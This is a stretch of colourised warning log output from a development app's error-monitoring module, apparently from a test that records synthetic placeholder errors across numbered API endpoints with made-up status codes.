WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766777Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1498'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766825Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m30[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1499'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766875Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1500'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1501'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.766972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1502'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1503'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1504'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1505'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1506'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767210Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1507'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767258Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1508'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1509'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767352Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1510'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767400Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1511'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767447Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1512'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767496Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1513'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767544Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1514'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767660Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1515'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767746Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1516'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1517'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767861Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1518'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767917Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1519'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.767968Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1520'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768021Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1521'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768074Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1522'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768125Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1523'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768177Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1524'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768238Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1525'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768290Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1526'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768340Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1527'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768390Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1528'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768439Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1529'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768487Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1530'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768537Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1531'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768586Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1532'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768635Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1533'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768683Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1534'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1535'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768780Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1536'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.768828Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m31[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1537'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
